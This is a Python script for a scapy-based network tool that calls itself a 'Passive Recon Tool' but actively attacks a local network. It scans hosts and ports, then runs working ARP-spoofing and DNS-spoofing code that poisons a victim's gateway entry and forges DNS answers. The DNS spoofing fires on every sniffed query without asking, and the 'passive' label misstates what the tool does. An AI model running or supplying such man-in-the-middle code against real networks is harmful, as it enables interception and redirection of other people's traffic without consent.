from scapy.all import *
from datetime import datetime
import requests
from rich.console import Console
from rich.table import Table
from rich import box
import socket
import csv
import json
import threading
import time
import os

log_file = "sniffer_log.txt"
console = Console()

# DNS spoof table
dns_spoof_table = {
    "example.com.": "192.168.1.100",
    "test.com.": "192.168.1.101"
}

def log(msg, style="white"):
    console.print(f"[{style}]{msg}[/]")
    with open(log_file, "a") as f:
        f.write(f"{datetime.now()} | {msg}\n")

def export_logs_csv():
    with open(log_file) as f:
        lines = f.readlines()
    with open("sniffer_log.csv", "w", newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["Timestamp", "Message"])
        for line in lines:
            if " | " in line:
                timestamp, msg = line.strip().split(" | ", 1)
                writer.writerow([timestamp, msg])

def export_logs_json():
    with open(log_file) as f:
        lines = f.readlines()
    data = []
    for line in lines:
        if " | " in line:
            timestamp, msg = line.strip().split(" | ", 1)
            data.append({"timestamp": timestamp, "message": msg})
    with open("sniffer_log.json", "w") as jsonfile:
        json.dump(data, jsonfile, indent=2)

def packet_callback(packet, target_ip=None, proto_filters=None):
    if IP in packet:
        ip_src = packet[IP].src
        ip_dst = packet[IP].dst

        if target_ip and target_ip not in [ip_src, ip_dst]:
            return

        if proto_filters:
            if TCP in packet and packet[TCP].dport not in proto_filters and packet[TCP].sport not in proto_filters:
                return

        log(f"[IP] {ip_src} → {ip_dst}", "cyan")

        if packet.haslayer(DNS) and packet.haslayer(UDP):
            try:
                dns_qname = packet[DNS].qd.qname.decode('utf-8')
                log(f"[DNS] {ip_src} queried {dns_qname}", "magenta")
            except:
                pass

        elif TCP in packet:
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            flags = packet[TCP].flags
            for port in [sport, dport]:
                service = get_common_service(port)
                if service:
                    log(f"[Service] {ip_src}:{sport} → {ip_dst}:{dport} [{service}]", "green")

    elif ARP in packet:
        arp_src = packet[ARP].psrc
        arp_dst = packet[ARP].pdst
        log(f"[ARP] {arp_src} is asking about {arp_dst}", "yellow")

def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode()
        spoof_ip = dns_spoof_table.get(qname)
        if spoof_ip:
            log(f"[DNS SPOOF] Spoofing {qname} → {spoof_ip}", "bold red")
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp = UDP(dport=pkt[UDP].sport, sport=53)
            dns = DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=qname, rdata=spoof_ip)
            )
            spoof_pkt = ip / udp / dns
            send(spoof_pkt, verbose=0)

def choose_interface():
    interfaces = get_if_list()
    console.print("\n[bold cyan]Available Network Interfaces:[/]\n")
    for i, iface in enumerate(interfaces):
        console.print(f" [bold green]{i}[/]: {iface}")
    try:
        choice = int(console.input("\n[bold yellow]Choose interface number: [/]").strip())
        return interfaces[choice]
    except:
        console.print("[bold red]Invalid choice. Exiting.[/]")
        exit()

def get_ip_range(interface):
    ip = get_if_addr(interface)
    return ".".join(ip.split('.')[:3]) + ".0/24"

def guess_os(ttl):
    if ttl >= 128:
        return "Windows"
    elif ttl >= 64:
        return "Linux"
    elif ttl >= 255:
        return "Cisco/Unix"
    else:
        return "Unknown"

def get_mac_vendor(mac):
    try:
        response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
        if response.status_code == 200:
            return response.text.strip()
    except:
        pass
    return "Unknown Vendor"

def enrich_host_info(ip, mac):
    try:
        pkt = sr1(IP(dst=ip)/ICMP(), timeout=2, verbose=0)
        os_guess = guess_os(pkt.ttl) if pkt else "No reply"
    except:
        os_guess = "N/A"
    vendor = get_mac_vendor(mac)
    services = scan_common_ports(ip)
    return os_guess, vendor, ", ".join(services) if services else "None"

def scan_common_ports(ip):
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 139: "SMB", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP"
    }
    open_services = []
    for port, name in common_ports.items():
        try:
            sock = socket.socket()
            sock.settimeout(0.3)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_services.append(name)
            sock.close()
        except:
            pass
    return open_services

def get_common_service(port):
    services = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 139: "SMB", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP"
    }
    return services.get(port)

def scan_live_hosts(interface):
    ip_range = get_ip_range(interface)
    console.print(f"\n[bold magenta]📡 Scanning local network: {ip_range}[/]\n")
    answered, _ = arping(ip_range, iface=interface, timeout=2, verbose=False)

    table = Table(title="🧭 Live Hosts Found", box=box.ROUNDED, border_style="bright_green")
    table.add_column("#", justify="center")
    table.add_column("IP Address", style="cyan")
    table.add_column("MAC Address", style="green")
    table.add_column("OS", style="magenta")
    table.add_column("Vendor", style="yellow")
    table.add_column("Services", style="bright_blue")

    live_hosts = []
    for i, (snd, rcv) in enumerate(answered, 1):
        ip = rcv.psrc
        mac = rcv.hwsrc
        os_guess, vendor, services = enrich_host_info(ip, mac)
        live_hosts.append([i, ip, mac, os_guess, vendor])
        table.add_row(str(i), ip, mac, os_guess, vendor, services)

    console.print(table)
    return live_hosts

def spoof_arp(victim_ip, spoof_ip, iface):
    victim_mac = getmacbyip(victim_ip)
    if not victim_mac:
        console.print(f"[red]❌ Could not get MAC for {victim_ip}[/]")
        return

    pkt = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    while True:
        send(pkt, iface=iface, verbose=0)
        time.sleep(2)

def start_sniffing(interface, target_ip=None, proto_filters=None):
    console.print(f"\n[bold green]🔍 Sniffing on {interface}[/]")
    if target_ip:
        console.print(f"[bold yellow]🎯 Target IP filter: {target_ip}[/]")
    console.print("[bold cyan]📦 Press Ctrl+C to stop.\n[/]")
    try:
        sniff(
            iface=interface,
            filter="udp port 53 or arp or ip",
            prn=lambda pkt: (
                dns_spoof(pkt) if pkt.haslayer(DNSQR) else packet_callback(pkt, target_ip, proto_filters)
            ),
            store=0
        )
    except KeyboardInterrupt:
        console.print("\n✅ [green]Sniffing stopped by user.[/]")
        console.print(f"📁 [bold]Logs saved in:[/] {log_file}")
        export_logs_csv()
        export_logs_json()

if __name__ == "__main__":
    console.print(r"""
[bold green]
   _____ _ _       _         _             _  __ _           
  / ____(_) |     (_)       | |           (_)/ _(_)          
 | (___  _| |_ ___ _  ___   | | ___   __ _ _| |_ _  ___ ___  
  \___ \| | __/ _ \ |/ __|  | |/ _ \ / _` | |  _| |/ __/ _ \ 
  ____) | | ||  __/ | (__   | | (_) | (_| | | | | | (_|  __/ 
 |_____/|_|\__\___|_|\___|  |_|\___/ \__, |_|_| |_|\___\___| 
                                     __/ |                  
                                    |___/                  
[/bold green]
[cyan]SilentSniffer v3 — Passive Recon Tool | By [bold red]niraj-cmd[/cyan]
[red]⚠️ Use DNS spoofing only in test environments with permission.[/red]
""")

    iface = choose_interface()
    live_hosts = scan_live_hosts(iface)

    target_ip = None
    if live_hosts:
        choice = console.input("\n[bold yellow]🎯 Enter target number (or IP), or Enter to sniff all: [/]").strip()
        if choice.isdigit():
            index = int(choice) - 1
            if 0 <= index < len(live_hosts):
                target_ip = live_hosts[index][1]
        elif "." in choice:
            target_ip = choice
        else:
            console.print("[cyan]👁️ Monitoring all traffic.[/]")

    proto_ports = {
        "http": 80, "ftp": 21, "smtp": 25, "dns": 53,
        "https": 443, "ssh": 22
    }
    selected = console.input("[bold yellow]💡 Filter by protocol (http, ftp, etc) or press Enter: [/]").strip().lower()
    proto_filter = [proto_ports[selected]] if selected in proto_ports else None

    if target_ip:
        spoof_opt = console.input("[bold red]⚠️ Start ARP spoofing this host? (y/N): [/]").strip().lower()
        if spoof_opt == 'y':
            gw_ip = console.input("🌐 Enter router/gateway IP to spoof: ").strip()
            threading.Thread(target=spoof_arp, args=(target_ip, gw_ip, iface), daemon=True).start()

    start_sniffing(iface, target_ip, proto_filter)
